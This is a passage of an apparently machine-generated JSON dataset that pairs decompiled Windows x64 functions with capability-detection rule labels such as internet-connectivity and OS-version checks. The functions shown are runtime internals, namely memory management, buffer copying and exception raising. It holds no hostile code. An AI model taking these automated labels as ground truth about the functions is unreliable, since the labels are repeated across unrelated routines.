uVar11 = in_DL;\n        *(*0x20 + -8) = unaff_R12;\n        *(*0x20 + -0x10) = unaff_RDI;\n        *(*0x20 + -0x18) = unaff_RSI;\n        *(*0x20 + -0x20) = unaff_RBX;\n        if (piVar8 == NULL) {\n            return;\n        }\n        if ((*(piVar7 + 0x11) & 1) != 0) {\n            return;\n        }\n        if (*(piVar7 + 2) == '\\x04') {\ncode_r0x00014000536a:\n            iVar4 = *piVar7;\n            iVar5 = *piVar7[3];\n            for (iVar19 = 0; iVar19 <= iVar4 / iVar5 + -1; iVar19 = iVar19 + 1) {\n                piVar2 = piVar7[3];\n                *(*0x20 + -0x2c) = uVar11;\n                iVar3 = *piVar2;\n                *(*0x20 + -0x60) = 0x14000539c;\n                func_0x000140005300(iVar3 * iVar19 + piVar8);\n                uVar11 = *(*0x20 + -0x2c);\n            }\n            return;\n        }\n    // switch table (13 cases) at 0x14001c118\n        switch(*(piVar7 + 2)) {\n        case '\\x10':\n        case '\\x1b':\n            goto code_r0x00014000536a;\n        case '\\x11':\n        case '\\x12':\n            iVar4 = *(*0x20 + -0x10);\n            pcVar10 = piVar7[4];\n            pcVar13 = *(*0x20 + -0x20);\n            uVar6 = *(*0x20 + -0x18);\n            piVar7 = *(*0x20 + -8);\n            while( true ) {\n                while( true ) {\n                    pcVar9 = pcVar10;\n                    *(*0x20 + -8) = unaff_R13;\n                    *(*0x20 + -0x10) = piVar7;\n                    *(*0x20 + -0x18) = unaff_RBP;\n                    *(*0x20 + -0x20) = iVar4;\n                    *(*0x20 + -0x28) = uVar6;\n                    *(*0x20 + -0x30) = pcVar13;\n                    cVar1 = *pcVar9;\n                    if (cVar1 != '\\x02') break;\n                    iVar4 = 0;\n                    unaff_R13 = 0x11400000;\n                    unaff_RBP = *(pcVar9 + 0x20) + -1;\n                    while( true ) {\n                        if (unaff_RBP < iVar4) {\n                            return;\n                        }\n                        pcVar10 = *(*(pcVar9 + 0x28) + iVar4 * 8);\n                        if (*pcVar10 != '\\x01') break;\n                        iVar5 = *(pcVar10 + 0x10);\n                        iVar19 = *(pcVar10 + 8);\n                        if ((0x11400000U >> (*(iVar5 + 0x10) & 0x3f) & 1) == 0) {\n                            *(*0x20 + -0x60) = 0x140005453;\n                            func_0x000140005300(iVar19 + piVar8, iVar5);\n                        }\n                        else {\n                            uVar12 = *(iVar19 + piVar8);\n                            *(*0x20 + -0x60) = 0x14000545f;\n                            fcn.1400052cb(uVar12);\n                        }\n                        iVar4 = iVar4 + 1;\n                    }\n                    puVar14 = *0x20 + -0x60;\n                    *0x20 = *0x20 + -0x60;\n                    *puVar14 = 0x14000542a;\n                    pcVar13 = pcVar9;\n                    uVar6 = uVar11;\n                    piVar7 = piVar8;\n                }\n                if (cVar1 != '\\x03') break;\n                iVar4 = **(pcVar9 + 0x10);\n                if (iVar4 == 4) {\n                    uVar6 = *(*(pcVar9 + 8) + piVar8);\n                }\n                else if (iVar4 < 5) {\n                    if (iVar4 == 1) {\n                        uVar6 = *(*(pcVar9 + 8) + piVar8);\n                    }\n                    else {\n                        if (iVar4 != 2) goto code_r0x000140005487;\n                        uVar6 = *(*(pcVar9 + 8) + piVar8);\n                    }\n                }\n                else if (iVar4 == 8) {\n                    uVar6 = *(*(pcVar9 + 8) + piVar8);\n                }\n                else {\ncode_r0x000140005487:\n                    uVar6 = 0;\n                }\n                if (((*(pcVar9 + 0x20) <= uVar6) || (pcVar10 = *(*(pcVar9 + 0x28) + uVar6 * 8),  pcVar10 == NULL)) &&\n                   (pcVar10 = *(*(pcVar9 + 0x28) + *(pcVar9 + 0x20) * 8),  pcVar10 == NULL)) {\n                    return;\n                }\n                iVar4 = *(*0x20 + -0x20);\n                unaff_RBP = *(*0x20 + -0x18);\n                unaff_R13 = *(*0x20 + -8);\n                pcVar13 = *(*0x20 + -0x30);\n                uVar6 = *(*0x20 + -0x28);\n                piVar7 = *(*0x20 + -0x10);\n            }\n            if (cVar1 != '\\x01') {\n                return;\n            }\n            piVar7 = *(pcVar9 + 0x10);\n            piVar8 = *(pcVar9 + 8) + piVar8;\n            unaff_RBX = *(*0x20 + -0x30);\n            unaff_RSI = *(*0x20 + -0x28);\n            unaff_RDI = *(*0x20 + -0x20);\n            unaff_RBP = *(*0x20 + -0x18);\n            unaff_R12 = *(*0x20 + -0x10);\n            unaff_R13 = *(*0x20 + -8);\n            break;\n        default:\n            return;\n        case '\\x16':\n        case '\\x18':\n        case '\\x1c':\n            uVar12 = *(*0x20 + -0x20);\n            uVar16 = *(*0x20 + -0x18);\n            uVar18 = *(*0x20 + -0x10);\n            uVar21 = *(*0x20 + -8);\n            if (*piVar8 == 0) {\n                return;\n            }\n            arg1_00 = *piVar8 + -0x10;\n            if (in_DL == 2) {\n                uVar11 = *arg1_00;\n                *arg1_00 = uVar11 - 8;\n                if (7 < uVar11 - 8) {\n                    return;\n                }\n                piVar7 = 0x1400eb2f8;\n                if ((*arg1_00 & 4) != 0) {\n                    return;\n                }\n                *arg1_00 = *arg1_00 | 4;\n            }\n            else {\n                if (in_DL < 3) {\n                    if (in_DL == 0) {\n                        *(*0x20 + -8) = uVar21;\n                        *(*0x20 + -0x10) = uVar12;\n                        *(*0x20 + 8) = arg1_00;\n                        *(*0x20 + -0x40) = 0x140005241;\n                        fcn.1400050cf(arg1_00);\n                        *(*0x20 + -0x40) = 0x140005250;\n                        fcn.1400054f4(*(*0x20 + 8));\n                        iVar4 = *0x1400eb338;\n                        goto code_r0x000140005257;\n                    }\n                }\n                else if (in_DL != 3) {\n                    return;\n                }\n                piVar7 = 0x1400eb328;\n            }\n            *(*0x20 + -8) = uVar21;\n            *(*0x20 + -0x10) = unaff_RBP;\n            *(*0x20 + -0x18) = uVar18;\n            *(*0x20 + -0x20) = uVar16;\n            *(*0x20 + -0x28) = uVar12;\n            if (piVar7[1] <= *piVar7) {\n                iVar4 = (piVar7[1] * 3) / 2;\n                piVar7[1] = iVar4;\n                *(*0x20 + -0x50) = 0x140004dd8;\n                iVar5 = fcn.1400029cb(0x1400eb348, iVar4 * 8 + 0x10);\n                puVar15 = piVar7[2];\n                *(iVar5 + 8) = 1;\n                puVar17 = iVar5 + 0x10;\n                for (iVar4 = *piVar7 * 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar17 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    puVar17 = puVar17 + 1;\n                }\n                iVar4 = piVar7[2];\n                *(*0x20 + -0x50) = 0x140004e01;\n                fcn.140004d89(iVar4);\n                piVar7[2] = iVar5 + 0x10;\n            }\n            iVar4 = *piVar7;\n            *(piVar7[2] + iVar4 * 8) = arg1_00;\n            *piVar7 = iVar4 + 1;\n            return;\n        }\n    } while( true );\ncode_r0x000140005257:\n    if (*0x1400eb328 < 1) {\n        return;\n    }\n    *0x1400eb328 = *0x1400eb328 + -1;\n    uVar11 = *(iVar4 + *0x1400eb328 * 8);\n    *(*0x20 + -0x40) = 0x14000527d;\n    iVar5 = fcn.140001e0c(uVar11 >> 0xc);\n    if (iVar5 != 0) goto code_r0x00014000528c;\n    *(*0x20 + -0x40) = 0x14000528a;\n    fcn.1400050cf(uVar11);\n    goto code_r0x0001400052b4;\ncode_r0x00014000528c:\n    uVar6 = uVar11 >> 4 & 0xff;\n    uVar20 = 1 << (uVar6 & 0x3f);\n    iVar19 = (uVar6 >> 6) + 2;\n    uVar6 = *(iVar5 + iVar19 * 8);\n    if ((uVar6 & uVar20) == 0) {\n        *(iVar5 + iVar19 * 8) = uVar6 | uVar20;\ncode_r0x0001400052b4:\n        *(*0x20 + -0x40) = 0x1400052c1;\n        fcn.1400054f4(uVar11);\n        iVar4 = *0x1400eb338;\n    }\n    goto code_r0x000140005257;\n}\n",
        "token_count": 3274
    },
    "14000591": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140005911(void)\n\n{\n    uint64_t *arg1;\n    uint64_t **ppuVar1;\n    int64_t iVar2;\n    \n    ppuVar1 = *0x1400eb308;\n    while (0 < *0x1400eb2f8) {\n        arg1 = *ppuVar1;\n        *arg1 = *arg1 & 0xfffffffffffffffb;\n        iVar2 = *0x1400eb2f8 + -1;\n        *0x1400eb2f8 = *0x1400eb2f8 + -1;\n        *ppuVar1 = ppuVar1[iVar2];\n        if (*arg1 < 8) {\n            fcn.140001780(arg1);\n            fcn.1400054f4(arg1);\n            fcn.140004c1d(0x1400eb348, arg1);\n            ppuVar1 = *0x1400eb308;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 223
    },
    "14000598": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140005984(void)\n\n{\n    ulong *puVar1;\n    char cVar2;\n    int64_t iVar3;\n    int64_t **ppiVar4;\n    ulong *puVar5;\n    uint64_t arg1;\n    uint8_t *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint8_t *arg1_00;\n    uint64_t uVar11;\n    uint64_t *puVar12;\n    uint64_t uStack96;\n    \n    iVar7 = *0x1400eb340;\n    if (((*0x1400eb2f0 <= *0x1400eb2f8) || (*0x1400eb2e8 <= *0x1400ed3e0)) && (*0x1400eb340 == 0)) {\n        iVar3 = fcn.140001e0a();\n        if (iVar3 <= *0x1400ede50) {\n            iVar3 = *0x1400ede50;\n        }\n        *0x1400eb348 = NULL;\n        ppiVar4 = *0x1400edbf0;\n        while (ppiVar4 != *ppiVar4) {\n            *0x1400eb348 = ppiVar4[2];\n            ppiVar4 = *ppiVar4;\n        }\n        *0x1400eb350 = 0xffffffffffffffff;\n        for (ppiVar4 = *0x1400edbf0; ppiVar4 != *ppiVar4; ppiVar4 = ppiVar4[1]) {\n            *0x1400eb350 = ppiVar4[3];\n        }\n        *0x1400ede50 = iVar3;\n        fcn.140005005();\n        iVar3 = *0x1400eb310;\n        if (*0x1400eb310 <= *0x1400ede58) {\n            iVar3 = *0x1400ede58;\n        }\n        *0x1400ede38 = *0x1400ede38 + 1;\n        *0x1400ede58 = iVar3;\n        cVar2 = fcn.140005911();\n        iVar3 = *0x1400ede48;\n        if ((cVar2 != '\\0') && (*0x1400eb2e8 <= *0x1400ed3e0)) {\n            while (puVar5 = *0x1400ede80,  0 < *0x1400eb2f8) {\n                fcn.140005911();\n            }\n            while (puVar5 != NULL) {\n                puVar1 = *puVar5;\n                fcn.140004d89(puVar5);\n                puVar5 = puVar1;\n            }\n            *0x1400ede80 = NULL;\n            fcn.140004d89(*0x1400ede88);\n            *0x1400ede88 = 0;\n            *0x1400ede70 = 0;\n            *0x1400ede88 = fcn.140002d30(0x2000);\n            iVar9 = *0x1400eb320;\n            *0x1400ede78 = 0x3ff;\n            *0x1400ede70 = 0;\n            *0x1400ede80 = NULL;\n            iVar3 = *0x1400eb310 + -1;\n            for (iVar8 = 0; iVar8 <= iVar3; iVar8 = iVar8 + 1) {\n                fcn.14000522b(*(iVar9 + iVar8 * 8));\n            }\n            if (*0x1400edea8 == 0) {\n                iVar3 = *0x1400e4380 + -1;\n                for (iVar9 = *0x1400edea8; iVar9 <= iVar3; iVar9 = iVar9 + 1) {\n                    (**(iVar9 * 8 + 0x1400dd620))();\n                }\n            }\n            iVar3 = *0x1400eb240 + -1;\n            for (iVar9 = 0; iVar8 = *0x1400edea0,  iVar9 <= iVar3; iVar9 = iVar9 + 1) {\n                (**(iVar9 * 8 + 0x1400e44e0))();\n            }\n            iVar3 = *0x1400ede90 + -1;\n            for (iVar9 = 0; iVar9 <= iVar3; iVar9 = iVar9 + 1) {\n                fcn.14000522b(*(iVar8 + iVar9 * 8));\n            }\n            *0x1400edc10 = 1;\n            iVar3 = 0;\n            do {\n                for (puVar5 = *(iVar3 * 8 + 0x1400ed3f0); puVar5 != NULL; puVar5 = *puVar5) {\n                    uStack96 = 0;\n                    puVar12 = puVar5 + 2;\n                    do {\n                        uVar11 = uStack96;\n                        for (uVar10 = *puVar12; uVar10 != 0; uVar10 = uVar10 >> 1) {\n                            if ((uVar10 & 1) != 0) {\n                                arg1 = puVar5[1] << 9 | uVar11;\n                                cVar2 = fcn.140001ea0(arg1);\n                                if ((cVar2 != '\\0') && (puVar6 = arg1 * 0x1000,  (*puVar6 & 1) != 0)) {\n                                    iVar9 = *(puVar6 + 8);\n                                    if (iVar9 < 0xfc1) {\n                                        arg1_00 = puVar6 + 0x40;\n                                        puVar6 = arg1_00 + *(puVar6 + 0x30);\n                                        for (; arg1_00 < puVar6; arg1_00 = arg1_00 + iVar9) {\n                                            if ((1 < *(arg1_00 + 8)) && (cVar2 = fcn.140001e3f(arg1_00),  cVar2 == '\\0')\n                                               ) {\n                                                fcn.140001780(arg1_00);\n                                                fcn.140004c1d(0x1400eb348, arg1_00);\n                                            }\n                                        }\n                                    }\n                                    else if (1 < *(puVar6 + 0x28)) {\n                                        puVar6 = puVar6 + 0x20;\n                                        cVar2 = fcn.140001e3f(puVar6);\n                                        if (cVar2 == '\\0') {\n                                            fcn.140001780(puVar6);\n                                            fcn.140004c1d(0x1400eb348, puVar6);\n                                        }\n                                    }\n                                }\n                            }\n                            uVar11 = uVar11 + 1;\n                        }\n                        uStack96 = uStack96 + 0x40;\n                        puVar12 = puVar12 + 1;\n                    } while (uStack96 != 0x200);\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 != 0x100);\n            *0x1400ede40 = *0x1400ede40 + 1;\n            *0x1400edc10 = 0;\n            *0x1400eb2e8 = *0x1400ed3e0 * 2;\n            if (*0x1400eb2e8 < 0x400000) {\n                *0x1400eb2e8 = 0x400000;\n            }\n            iVar3 = *0x1400eb2e8;\n            if (*0x1400eb2e8 <= *0x1400ede48) {\n                iVar3 = *0x1400ede48;\n            }\n        }\n        *0x1400ede48 = iVar3;\n        iVar9 = *0x1400eb320;\n        iVar3 = *0x1400eb310 + -1;\n        for (; iVar7 <= iVar3; iVar7 = iVar7 + 1) {\n            fcn.140004ea2(*(iVar9 + iVar7 * 8));\n        }\n        *0x1400eb310 = 0;\n        *0x1400eb2f0 = *0x1400eb2f8 * 2;\n        if (*0x1400eb2f0 < 500) {\n            *0x1400eb2f0 = 500;\n        }\n    }\n    return;\n}\n",
        "token_count": 1875
    },
    "140005dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140005dc7(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t *piVar5;\n    \n    piVar2 = arg1;\n    if (arg1 != NULL) {\n        if (arg1[1] < 0) {\n            arg1[-2] = arg1[-2] + 8;\n        }\n        else {\n            iVar3 = *arg1;\n            if (iVar3 < 7) {\n                iVar3 = 7;\n            }\n            piVar2 = fcn.140005d7d(iVar3 + 0x11);\n            iVar1 = *arg1;\n            piVar2[1] = iVar3;\n            *piVar2 = iVar1;\n            piVar4 = arg1 + 2;\n            piVar5 = piVar2 + 2;\n            for (iVar3 = *arg1 + 1; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar5 = *piVar4;\n                piVar4 = piVar4 + 1;\n                piVar5 = piVar5 + 1;\n            }\n        }\n    }\n    return piVar2;\n}\n",
        "token_count": 290
    },
    "14000610": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140006100(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    \n    piVar1 = arg1;\n    if ((arg1 != NULL) && (-1 < arg1[1])) {\n        piVar1 = fcn.140005f46(*arg1);\n        iVar2 = *arg1;\n        *piVar1 = iVar2;\n        piVar3 = arg1 + 2;\n        piVar4 = piVar1 + 2;\n        for (iVar2 = iVar2 + 1; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *piVar4 = *piVar3;\n            piVar3 = piVar3 + 1;\n            piVar4 = piVar4 + 1;\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 210
    },
    "14000658": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140006585(ulong arg1)\n\n{\n    ulong uVar1;\n    int64_t *piVar2;\n    int64_t iStack56;\n    int64_t *piStack48;\n    \n    piVar2 = 0x1400d5760;\n    while( true ) {\n        fcn.140002078(&iStack56, 0x10);\n        iStack56 = *piVar2;\n        piStack48 = fcn.140006100(piVar2[1]);\n        if (arg1 == iStack56) break;\n        piVar2 = piVar2 + 2;\n        if (piVar2 == 0x1400d6190) {\n            return 0;\n        }\n    }\n    if ((piStack48 != NULL) && (*piStack48 != 0)) {\n        uVar1 = fcn.140006100(piStack48);\n        return uVar1;\n    }\n    uVar1 = fcn.140006561(iStack56);\n    return uVar1;\n}\n",
        "token_count": 225
    },
    "140006a3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x000140006cda: Changing call to branch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140006a3d(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    ulong *arg1_00;\n    char **ppcVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong *arg1_01;\n    ulong uVar6;\n    char *unaff_RBX;\n    uchar *puVar7;\n    ulong *puVar8;\n    uint64_t uVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    ulong in_R8;\n    int64_t in_R9;\n    ulong in_stack_00000000;\n    uchar auStack216 [32];\n    ulong uStack184;\n    int64_t *piStack168;\n    int64_t iStack160;\n    ulong uStack104;\n    ulong uStack96;\n    int64_t iStack88;\n    \n    iVar4 = arg1;\n    if (*0x1400eb250 == 0) {\n        fcn.140006a38(arg1);\n        iVar4 = 1;\n        sub.msvcrt.dll_exit();\n    }\n    fcn.140004ec2(iVar4 + 0x28, *0x1400eb248);\n    fcn.140004ec2(0x1400eb248, arg1);\n    uVar6 = 1;\n    iStack160 = *0x1400eb250 + 0x10;\n    (*_sym.imp.msvcrt.dll_longjmp)();\n    if (*(iStack160 + 0x10) == 0) {\n        *(iStack160 + 0x10) = uVar6;\n    }\n    fcn.140002078(&uStack104, 0x18);\n    piVar1 = *(iStack160 + 0x20);\n    uStack104 = in_R8;\n    uStack96 = in_stack_00000000;\n    iStack88 = in_R9;\n    if (piVar1 == NULL) {\n        piStack168 = fcn.140006ca8(0x1400e4420, 1);\n        *piStack168 = 0;\n    }\n    else {\n        piStack168 = piVar1;\n        if ((piVar1[1] & 0x3fffffffffffffffU) <= *piVar1) {\n            uVar6 = fcn.1400017aa(piVar1[1] & 0x3fffffffffffffffU);\n            uVar9 = 0x10;\n            piStack168 = fcn.140006ca8(0x1400e4420, uVar6);\n            piVar2 = *0x1400e4438;\n            iVar4 = *piVar1;\n            iVar5 = (*0x1400e4438)[1];\n            *piStack168 = iVar4;\n            if (iVar5 != 0) {\n                uVar9 = iVar5 + 0xfU & -iVar5;\n            }\n            puVar10 = uVar9 + piVar1;\n            puVar11 = piStack168 + uVar9;\n            for (iVar4 = iVar4 * *piVar2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar11 = *puVar10;\n                puVar10 = puVar10 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            *piVar1 = 0;\n        }\n    }\n    fcn.140004ec2(iStack160 + 0x20, piStack168);\n    piVar1 = *(iStack160 + 0x20);\n    iVar4 = *piVar1;\n    *piVar1 = iVar4 + 1;\n    *(piVar1 + iVar4 * 3 + 2) = uStack104;\n    *(piVar1 + iVar4 * 0x18 + 0x14) = uStack104._4_4_;\n    *(piVar1 + iVar4 * 3 + 3) = uStack96;\n    *(piVar1 + iVar4 * 0x18 + 0x1c) = uStack96._4_4_;\n    piVar1[iVar4 * 3 + 4] = iStack88;\n    iVar5 = iStack160;\n    fcn.140006a3d(iStack160);\n    puVar7 = auStack216;\n    arg1_00 = fcn.140006146(0x1400eb2a0, 0x30);\n    *arg1_00 = 0x1400eb260;\n    iVar4 = arg1_00[3];\n    arg1_00[2] = \"IOError\";\n    uVar6 = fcn.140005dc7(iVar5);\n    arg1_00[3] = uVar6;\n    if (iVar4 != 0) {\n        fcn.140004e35(iVar4);\n    }\n    fcn.140004e55(arg1_00 + 1, 0);\n    uStack184 = 0x99;\n    fcn.140006a95(arg1_00, \"IOError\");\n    while( true ) {\n        *(puVar7 + -8) = arg1_00;\n        *(puVar7 + -0x10) = unaff_RBX;\n        *(puVar7 + -0x50) = 0x140006c43;\n        arg1_00 = fcn.140006146(0x1400e44a0, 0x30);\n        *arg1_00 = 0x1400e4460;\n        iVar4 = arg1_00[3];\n        arg1_00[2] = \"OverflowDefect\";\n        *(puVar7 + -0x50) = 0x140006c6e;\n        uVar6 = fcn.140005dc7(0x1400d6480);\n        arg1_00[3] = uVar6;\n        if (iVar4 != 0) {\n            *(puVar7 + -0x50) = 0x140006c81;\n            fcn.140004ea2(iVar4 + -0x10);\n        }\n        *(puVar7 + -0x28) = 0x36;\n        unaff_RBX = \"OverflowDefect\";\n        *(puVar7 + -0x50) = 0x140006ca7;\n        arg1_01 = arg1_00;\n        fcn.140006a95(arg1_00, \"OverflowDefect\");\n        *(puVar7 + -0x50) = iVar4;\n        piVar1 = arg1_01[3];\n        iVar4 = piVar1[1];\n        uVar9 = 0x10;\n        if (iVar4 != 0) {\n            uVar9 = iVar4 + 0xfU & -iVar4;\n        }\n        iVar4 = unaff_RBX * *piVar1;\n        if ((SEXT816(iVar4) == SEXT816(unaff_RBX) * SEXT816(*piVar1)) && (!SCARRY8(uVar9, iVar4))) break;\n        puVar8 = puVar7 + -0x78;\n        puVar7 = puVar7 + -0x78;\n        *puVar8 = 0x140006cdf;\n    }\n    *(puVar7 + -0x78) = 0x140006ce4;\n    ppcVar3 = fcn.140006146(arg1_01, uVar9 + iVar4);\n    *ppcVar3 = unaff_RBX;\n    ppcVar3[1] = unaff_RBX;\n    return;\n}\n",
        "token_count": 1706
    },
    "140006a9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x000140006cda: Changing call to branch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.140006a95(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    ulong uVar3;\n    ulong *arg1_00;\n    char **ppcVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong *arg1_01;\n    char *unaff_RBX;\n    uchar *puVar7;\n    ulong *puVar8;\n    uint64_t uVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    ulong in_R8;\n    int64_t in_R9;\n    ulong in_stack_00000028;\n    uchar auStack176 [32];\n    ulong uStack144;\n    int64_t *piStack128;\n    int64_t iStack120;\n    ulong uStack64;\n    ulong uStack56;\n    int64_t iStack48;\n    \n    if (*(arg1 + 0x10) == 0) {\n        *(arg1 + 0x10) = arg2;\n    }\n    fcn.140002078(&uStack64, 0x18);\n    piVar1 = *(arg1 + 0x20);\n    uStack56 = in_stack_00000028;\n    uStack64 = in_R8;\n    iStack48 = in_R9;\n    if (piVar1 == NULL) {\n        piStack128 = fcn.140006ca8(0x1400e4420, 1);\n        *piStack128 = 0;\n    }\n    else {\n        piStack128 = piVar1;\n        if ((piVar1[1] & 0x3fffffffffffffffU) <= *piVar1) {\n            uVar3 = fcn.1400017aa(piVar1[1] & 0x3fffffffffffffffU);\n            uVar9 = 0x10;\n            piStack128 = fcn.140006ca8(0x1400e4420, uVar3);\n            piVar2 = *0x1400e4438;\n            iVar5 = *piVar1;\n            iVar6 = (*0x1400e4438)[1];\n            *piStack128 = iVar5;\n            if (iVar6 != 0) {\n                uVar9 = iVar6 + 0xfU & -iVar6;\n            }\n            puVar10 = uVar9 + piVar1;\n            puVar11 = piStack128 + uVar9;\n            for (iVar5 = iVar5 * *piVar2; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar11 = *puVar10;\n                puVar10 = puVar10 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            *piVar1 = 0;\n        }\n    }\n    fcn.140004ec2(arg1 + 0x20, piStack128);\n    piVar1 = *(arg1 + 0x20);\n    iVar5 = *piVar1;\n    *piVar1 = iVar5 + 1;\n    *(piVar1 + iVar5 * 3 + 2) = uStack64;\n    *(piVar1 + iVar5 * 0x18 + 0x14) = uStack64._4_4_;\n    *(piVar1 + iVar5 * 3 + 3) = uStack56;\n    *(piVar1 + iVar5 * 0x18 + 0x1c) = uStack56._4_4_;\n    piVar1[iVar5 * 3 + 4] = iStack48;\n    iVar6 = arg1;\n    fcn.140006a3d(arg1);\n    puVar7 = auStack176;\n    iStack120 = arg1;\n    arg1_00 = fcn.140006146(0x1400eb2a0, 0x30);\n    *arg1_00 = 0x1400eb260;\n    iVar5 = arg1_00[3];\n    arg1_00[2] = \"IOError\";\n    uVar3 = fcn.140005dc7(iVar6);\n    arg1_00[3] = uVar3;\n    if (iVar5 != 0) {\n        fcn.140004e35(iVar5);\n    }\n    fcn.140004e55(arg1_00 + 1, 0);\n    uStack144 = 0x99;\n    fcn.140006a95(arg1_00, \"IOError\");\n    while( true ) {\n        *(puVar7 + -8) = arg1_00;\n        *(puVar7 + -0x10) = unaff_RBX;\n        *(puVar7 + -0x50) = 0x140006c43;\n        arg1_00 = fcn.140006146(0x1400e44a0, 0x30);\n        *arg1_00 = 0x1400e4460;\n        iVar5 = arg1_00[3];\n        arg1_00[2] = \"OverflowDefect\";\n        *(puVar7 + -0x50) = 0x140006c6e;\n        uVar3 = fcn.140005dc7(0x1400d6480);\n        arg1_00[3] = uVar3;\n        if (iVar5 != 0) {\n            *(puVar7 + -0x50) = 0x140006c81;\n            fcn.140004ea2(iVar5 + -0x10);\n        }\n        *(puVar7 + -0x28) = 0x36;\n        unaff_RBX = \"OverflowDefect\";\n        *(puVar7 + -0x50) = 0x140006ca7;\n        arg1_01 = arg1_00;\n        fcn.140006a95(arg1_00, \"OverflowDefect\");\n        *(puVar7 + -0x50) = iVar5;\n        piVar1 = arg1_01[3];\n        iVar5 = piVar1[1];\n        uVar9 = 0x10;\n        if (iVar5 != 0) {\n            uVar9 = iVar5 + 0xfU & -iVar5;\n        }\n        iVar5 = unaff_RBX * *piVar1;\n        if ((SEXT816(iVar5) == SEXT816(unaff_RBX) * SEXT816(*piVar1)) && (!SCARRY8(uVar9, iVar5))) break;\n        puVar8 = puVar7 + -0x78;\n        puVar7 = puVar7 + -0x78;\n        *puVar8 = 0x140006cdf;\n    }\n    *(puVar7 + -0x78) = 0x140006ce4;\n    ppcVar4 = fcn.140006146(arg1_01, uVar9 + iVar5);\n    *ppcVar4 = unaff_RBX;\n    ppcVar4[1] = unaff_RBX;\n    return;\n}\n",
        "token_count": 1578
    },
    "140006d2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
